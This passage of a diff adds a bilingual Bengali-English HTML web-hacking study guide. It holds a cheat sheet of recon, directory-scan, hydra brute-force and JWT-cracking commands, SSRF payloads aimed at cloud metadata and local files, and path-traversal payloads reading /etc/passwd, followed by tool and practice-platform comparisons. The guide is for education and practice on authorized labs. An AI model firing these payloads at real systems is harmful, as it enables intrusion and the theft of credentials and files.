+    <h2 class="sec">🔍 <span class="bn-text">Recon Commands</span><span class="en-text">Recon Commands</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#0d1b2a;">🌐 <span class="bn-text">Information Gathering</span><span class="en-text">Information Gathering</span></div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">whois target.com</span><span class="cheat-desc"><span class="bn-text">Domain info</span><span class="en-text">Domain info</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">dig target.com ANY</span><span class="cheat-desc"><span class="bn-text">DNS records</span><span class="en-text">DNS records</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">subfinder -d target.com</span><span class="cheat-desc"><span class="bn-text">Subdomains</span><span class="en-text">Subdomains</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">whatweb target.com</span><span class="cheat-desc"><span class="bn-text">Tech stack</span><span class="en-text">Tech stack</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">curl -I http://target.com</span><span class="cheat-desc"><span class="bn-text">Headers</span><span class="en-text">Headers</span></span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#0d1b2a;">📁 Directory Scan</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">gobuster dir -u URL -w wordlist</span><span class="cheat-desc">Gobuster</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">ffuf -u URL/FUZZ -w wordlist</span><span class="cheat-desc">FFUF</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">nikto -h target.com</span><span class="cheat-desc"><span class="bn-text">Vuln scan</span><span class="en-text">Vuln scan</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">wpscan --url URL</span><span class="cheat-desc">WordPress</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">nmap -sV -p 80,443,8080 IP</span><span class="cheat-desc"><span class="bn-text">Port scan</span><span class="en-text">Port scan</span></span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🔐 <span class="bn-text">Auth Attack Commands</span><span class="en-text">Auth Attack Commands</span></h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#3d2800;">🔓 Brute Force</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">hydra -l admin -P rockyou.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:Invalid"</span><span class="cheat-desc">Hydra POST</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">ffuf -u URL -X POST -d "user=FUZZ&pass=FUZZ2" -w list</span><span class="cheat-desc">FFUF BF</span></div>
+        </div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-card-header" style="background:#3d2800;">🎫 JWT</div>
+        <div class="cheat-card-body">
+          <div class="cheat-row"><span class="cheat-cmd">echo "payload" | base64 -d</span><span class="cheat-desc"><span class="bn-text">Decode</span><span class="en-text">Decode JWT</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">python3 jwt_tool.py TOKEN -X a</span><span class="cheat-desc">Alg:none</span></div>
+          <div class="cheat-row"><span class="cheat-cmd">hashcat -m 16500 jwt.txt rockyou.txt</span><span class="cheat-desc"><span class="bn-text">Secret crack</span><span class="en-text">Secret crack</span></span></div>
+          <div class="cheat-row"><span class="cheat-cmd">jwt.io</span><span class="cheat-desc"><span class="bn-text">Online decode</span><span class="en-text">Online decode</span></span></div>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec">🌐 SSRF Payloads</h2>
+    <div class="code">
+url=http://127.0.0.1/admin                    <span class="c"># localhost</span>
+url=http://169.254.169.254/latest/meta-data/  <span class="c"># AWS metadata</span>
+url=http://[::1]/admin                        <span class="c"># IPv6</span>
+url=http://0.0.0.0:8080/                      <span class="c"># all interfaces</span>
+url=http://2130706433/                        <span class="c"># 127.0.0.1 decimal</span>
+url=file:///etc/passwd                        <span class="c"># File read</span>
+url=gopher://127.0.0.1:25/MAIL               <span class="c"># Gopher protocol</span>
+    </div>
+
+    <h2 class="sec">🛣️ Path Traversal Payloads</h2>
+    <div class="code">
+../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd                  <span class="c"># URL encoded</span>
+....//....//....//etc/passwd                  <span class="c"># Double dot bypass</span>
+..%252F..%252Fetc%252Fpasswd                  <span class="c"># Double encoded</span>
+/etc/passwd%00.jpg                            <span class="c"># Null byte</span>
+..\/..\/..\/etc\/passwd                       <span class="c"># Mixed slash</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📋 <span class="bn-text">Cheat Sheet সারসংক্ষেপ</span><span class="en-text">Cheat Sheet Summary</span></h3>
+      <ul>
+        <li>💉 SQLi → <span class="bn-text"><code>'</code> দিয়ে test শুরু, তারপর UNION</span><span class="en-text">Start testing with <code>'</code>, then UNION</span></li>
+        <li>📜 XSS → <span class="bn-text"><code>alert(1)</code> দিয়ে test, cookie steal করো</span><span class="en-text">Test with <code>alert(1)</code>, steal cookies</span></li>
+        <li>🔐 Auth → <span class="bn-text">Default credentials, JWT alg:none, brute force</span><span class="en-text">Default credentials, JWT alg:none, brute force</span></li>
+        <li>🌐 SSRF → <span class="bn-text">127.0.0.1, 169.254.169.254 দিয়ে test</span><span class="en-text">Test with 127.0.0.1, 169.254.169.254</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ CH 11: TOOLS COMPARISON ══════════════════ -->
+<div class="chapter ch-compare">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 11</div>
+    <div class="chapter-title">🔧 Tools Comparison — <span class="bn-text">সেরা টুল বেছে নাও</span><span class="en-text">Choose the Best Tool</span></div>
+    <div class="chapter-desc"><span class="bn-text">Web Hacking-এর টুলগুলো পাশাপাশি তুলনা</span><span class="en-text">Side-by-side comparison of web hacking tools</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🕷️ Web Proxy <span class="bn-text">তুলনা</span><span class="en-text">Comparison</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th>
+        <th><span class="bn-text">ধরন</span><span class="en-text">Type</span></th>
+        <th><span class="bn-text">ভালো দিক</span><span class="en-text">Strengths</span></th>
+        <th><span class="bn-text">দুর্বল দিক</span><span class="en-text">Weaknesses</span></th>
+        <th><span class="bn-text">কখন ব্যবহার</span><span class="en-text">When to Use</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Burp Suite CE</strong></td><td>Proxy/Scanner</td><td><span class="bn-text">Industry standard, সব feature</span><span class="en-text">Industry standard, all features</span></td><td><span class="bn-text">Pro তে scanner নেই, ধীর intruder</span><span class="en-text">No scanner in CE, slow intruder</span></td><td><span class="bn-text">সব সময় প্রথম পছন্দ</span><span class="en-text">Always first choice</span></td></tr>
+        <tr><td><strong>Burp Suite Pro</strong></td><td>Proxy/Scanner</td><td><span class="bn-text">Automated scanner, fast intruder</span><span class="en-text">Automated scanner, fast intruder</span></td><td><span class="bn-text">দামী ($449/year)</span><span class="en-text">Expensive ($449/year)</span></td><td><span class="bn-text">Professional pentest</span><span class="en-text">Professional pentest</span></td></tr>
+        <tr><td><strong>OWASP ZAP</strong></td><td>Proxy/Scanner</td><td><span class="bn-text">Free, open source, auto scan</span><span class="en-text">Free, open source, auto scan</span></td><td><span class="bn-text">Burp-এর চেয়ে কম শক্তিশালী</span><span class="en-text">Less powerful than Burp</span></td><td><span class="bn-text">Automated scan, budget option</span><span class="en-text">Automated scan, budget option</span></td></tr>
+        <tr><td><strong>mitmproxy</strong></td><td>CLI Proxy</td><td><span class="bn-text">Scripting, automation</span><span class="en-text">Scripting, automation</span></td><td><span class="bn-text">GUI নেই</span><span class="en-text">No GUI</span></td><td><span class="bn-text">Automated interception</span><span class="en-text">Automated interception</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">📁 Directory Scanner <span class="bn-text">তুলনা</span><span class="en-text">Comparison</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th>
+        <th><span class="bn-text">গতি</span><span class="en-text">Speed</span></th>
+        <th><span class="bn-text">বিশেষত্ব</span><span class="en-text">Specialty</span></th>
+        <th><span class="bn-text">কখন ব্যবহার</span><span class="en-text">When to Use</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Gobuster</strong></td><td>⭐⭐⭐⭐⭐</td><td><span class="bn-text">দ্রুত, Golang-based</span><span class="en-text">Fast, Golang-based</span></td><td><span class="bn-text">CTF, quick scan</span><span class="en-text">CTF, quick scan</span></td></tr>
+        <tr><td><strong>FFUF</strong></td><td>⭐⭐⭐⭐⭐</td><td><span class="bn-text">সব ধরনের fuzzing</span><span class="en-text">All types of fuzzing</span></td><td><span class="bn-text">Parameter, subdomain, vhost fuzzing</span><span class="en-text">Parameter, subdomain, vhost fuzzing</span></td></tr>
+        <tr><td><strong>Dirb</strong></td><td>⭐⭐⭐</td><td><span class="bn-text">Old but reliable</span><span class="en-text">Old but reliable</span></td><td><span class="bn-text">Basic directory scan</span><span class="en-text">Basic directory scan</span></td></tr>
+        <tr><td><strong>Feroxbuster</strong></td><td>⭐⭐⭐⭐⭐</td><td>Rust-based, recursive</td><td><span class="bn-text">Recursive deep scan</span><span class="en-text">Recursive deep scan</span></td></tr>
+        <tr><td><strong>Dirbuster</strong></td><td>⭐⭐⭐</td><td>GUI, Java-based</td><td><span class="bn-text">Visual scan (beginner)</span><span class="en-text">Visual scan (beginner)</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">💉 SQLi Scanner <span class="bn-text">তুলনা</span><span class="en-text">Comparison</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">টুল</span><span class="en-text">Tool</span></th>
+        <th><span class="bn-text">Detection</span><span class="en-text">Detection</span></th>
+        <th><span class="bn-text">Automation</span><span class="en-text">Automation</span></th>
+        <th><span class="bn-text">কখন ব্যবহার</span><span class="en-text">When to Use</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>SQLmap</strong></td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td><td><span class="bn-text">সব SQL injection — প্রথম পছন্দ</span><span class="en-text">All SQL injection — first choice</span></td></tr>
+        <tr><td><strong>Manual (Burp)</strong></td><td>⭐⭐⭐⭐⭐</td><td>⭐</td><td><span class="bn-text">Complex logic, WAF bypass</span><span class="en-text">Complex logic, WAF bypass</span></td></tr>
+        <tr><td><strong>Havij (old)</strong></td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐</td><td><span class="bn-text">GUI (আর ব্যবহার করো না)</span><span class="en-text">GUI (no longer recommended)</span></td></tr>
+        <tr><td><strong>NoSQLMap</strong></td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐⭐</td><td>MongoDB, NoSQL injection</td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🎯 <span class="bn-text">কোন vulnerability-তে কোন টুল?</span><span class="en-text">Which Tool for Which Vulnerability?</span></h2>
+    <div class="grid2">
+      <div class="card danger-card">
+        <h4>⚔️ <span class="bn-text">Attack Tools</span><span class="en-text">Attack Tools</span></h4>
+        <table style="margin:0;font-size:12.5px;">
+          <thead><tr><th>Vuln</th><th>Tool</th></tr></thead>
+          <tbody>
+            <tr><td>SQLi</td><td>SQLmap, Burp</td></tr>
+            <tr><td>XSS</td><td>Burp, XSStrike</td></tr>
+            <tr><td>CSRF</td><td>Burp, Manual</td></tr>
+            <tr><td>SSRF</td><td>Burp, SSRFmap</td></tr>
+            <tr><td>Dir Scan</td><td>Gobuster, FFUF</td></tr>
+            <tr><td>Auth BF</td><td>Hydra, Burp Intruder</td></tr>
+            <tr><td>JWT</td><td>jwt_tool, hashcat</td></tr>
+            <tr><td>WordPress</td><td>WPScan</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="card success-card">
+        <h4>🛡️ <span class="bn-text">Defense Tools</span><span class="en-text">Defense Tools</span></h4>
+        <table style="margin:0;font-size:12.5px;">
+          <thead><tr><th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th><th>Tool</th></tr></thead>
+          <tbody>
+            <tr><td>WAF</td><td>ModSecurity, Cloudflare</td></tr>
+            <tr><td>Header Check</td><td>SecurityHeaders.com</td></tr>
+            <tr><td>SSL Check</td><td>SSL Labs</td></tr>
+            <tr><td>DAST</td><td>OWASP ZAP</td></tr>
+            <tr><td>SAST</td><td>SonarQube, Snyk</td></tr>
+            <tr><td>Dependency</td><td>Dependabot, OWASP DC</td></tr>
+            <tr><td>Monitoring</td><td>Wazuh, ELK Stack</td></tr>
+            <tr><td>Pentest Report</td><td>Dradis, Serpico</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <h2 class="sec">📚 <span class="bn-text">সেরা Practice Platform</span><span class="en-text">Best Practice Platforms</span></h2>
+    <table>
+      <thead><tr>
+        <th>Platform</th>
+        <th><span class="bn-text">ধরন</span><span class="en-text">Type</span></th>
+        <th><span class="bn-text">কার জন্য</span><span class="en-text">For Whom</span></th>
+        <th><span class="bn-text">খরচ</span><span class="en-text">Cost</span></th>
+        <th><span class="bn-text">Rating</span><span class="en-text">Rating</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>PortSwigger Web Academy</strong></td><td>Web Labs</td><td><span class="bn-text">সব স্তর</span><span class="en-text">All levels</span></td><td>Free</td><td>⭐⭐⭐⭐⭐ <span class="badge badge-g"><span class="bn-text">সেরা</span><span class="en-text">Best</span></span></td></tr>
+        <tr><td><strong>TryHackMe</strong></td><td>Guided</td><td><span class="bn-text">Beginner</span><span class="en-text">Beginner</span></td><td>Free+</td><td>⭐⭐⭐⭐⭐</td></tr>
+        <tr><td><strong>HackTheBox</strong></td><td>CTF</td><td><span class="bn-text">Intermediate+</span><span class="en-text">Intermediate+</span></td><td>Free+</td><td>⭐⭐⭐⭐⭐</td></tr>
+        <tr><td><strong>DVWA</strong></td><td>Local Lab</td><td><span class="bn-text">Beginner</span><span class="en-text">Beginner</span></td><td>Free</td><td>⭐⭐⭐⭐</td></tr>
+        <tr><td><strong>Juice Shop</strong></td><td>Local Lab</td><td><span class="bn-text">Modern app practice</span><span class="en-text">Modern app practice</span></td><td>Free</td><td>⭐⭐⭐⭐⭐</td></tr>
+        <tr><td><strong>HackerOne CTF</strong></td><td>Real Bug Bounty</td><td><span class="bn-text">Advanced</span><span class="en-text">Advanced</span></td><td>Free</td><td>⭐⭐⭐⭐⭐</td></tr>
+        <tr><td><strong>PentesterLab</strong></td><td>Labs</td><td><span class="bn-text">Structured learning</span><span class="en-text">Structured learning</span></td><td>Free+</td><td>⭐⭐⭐⭐</td></tr>
+      </tbody>
+    </table>
+
+    <div class="chapter-summary">
+      <h3>🔧 <span class="bn-text">Tools Selection গাইড</span><span class="en-text">Tools Selection Guide</span></h3>
+      <ul>
+        <li>🎯 <span class="bn-text">Proxy → Burp Suite CE দিয়ে শুরু করো</span><span class="en-text">Proxy → Start with Burp Suite CE</span></li>
+        <li>💉 <span class="bn-text">SQLi → SQLmap প্রথমে, তারপর manual</span><span class="en-text">SQLi → SQLmap first, then manual</span></li>
+        <li>📁 <span class="bn-text">Dir Scan → FFUF বা Gobuster</span><span class="en-text">Dir Scan → FFUF or Gobuster</span></li>
+        <li>🔐 <span class="bn-text">Auth Attack → Burp Intruder বা Hydra</span><span class="en-text">Auth Attack → Burp Intruder or Hydra</span></li>
+        <li>📚 <span class="bn-text">Practice → PortSwigger Academy সব lab করো</span><span class="en-text">Practice → Complete all PortSwigger Academy labs</span></li>
+      </ul>
+    </div>
+
+    <!-- Footer -->
+    <div style="text-align:center; margin-top:50px; padding:30px; background:#0d1b2a; border-radius:12px; color:rgba(255,255,255,0.7);">
+      <p style="font-size:20px; color:#e63946; margin-bottom:10px;">🕷️ "The web is full of vulnerabilities. Learn to find them before attackers do."</p>
+      <p><span class="bn-text">এই ডকুমেন্ট সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে। সব সময় authorized environment-এ practice করো।</span>
+         <span class="en-text">This document is entirely for educational purposes. Always practice in authorized environments.</span></p>
+      <p style="margin-top:12px; font-size:12px; color:#e63946;">v1.0 — Web Hacking & OWASP Top 10 | Bilingual | Dark/Light Mode</p>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════ JAVASCRIPT ══════════════════ -->
+<script>
+  document.body.classList.add('light-mode');
+
+  function toggleTheme() {
+    const btn = document.getElementById('themeBtn');
+    const body = document.body;
+    if (body.classList.contains('light-mode')) {
+      body.classList.replace('light-mode', 'dark-mode');
+      btn.textContent = '☀️ Light Mode';
+      btn.style.background = '#ffd60a';
+      btn.style.color = '#0d1b2a';
+      localStorage.setItem('wh_theme', 'dark');
+    } else {
+      body.classList.replace('dark-mode', 'light-mode');
+      btn.textContent = '🌙 Dark Mode';
+      btn.style.background = '#2dc653';
+      btn.style.color = '#0d1b2a';
+      localStorage.setItem('wh_theme', 'light');
+    }
+  }
+
+  function toggleLang() {
+    const btn = document.getElementById('langBtn');
+    const body = document.body;
+    if (body.classList.contains('lang-en')) {
+      body.classList.remove('lang-en');
+      btn.textContent = '🇬🇧 English';
+      btn.style.background = '#0077b6';
+      localStorage.setItem('wh_lang', 'bn');
+    } else {
+      body.classList.add('lang-en');
+      btn.textContent = '🇧🇩 বাংলা';
+      btn.style.background = '#e63946';
+      localStorage.setItem('wh_lang', 'en');
+    }
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    const savedTheme = localStorage.getItem('wh_theme');
+    const savedLang = localStorage.getItem('wh_lang');
+    if (savedTheme === 'dark') {
+      document.body.classList.replace('light-mode', 'dark-mode');
+      const btn = document.getElementById('themeBtn');
+      if (btn) { btn.textContent = '☀️ Light Mode'; btn.style.background = '#ffd60a'; btn.style.color = '#0d1b2a'; }
+    }
+    if (savedLang === 'en') {
+      document.body.classList.add('lang-en');
+      const btn = document.getElementById('langBtn');
+      if (btn) { btn.textContent = '🇧🇩 বাংলা'; btn.style.background = '#e63946'; }
+    }
+  });
+</script>
+</body>
+</html>
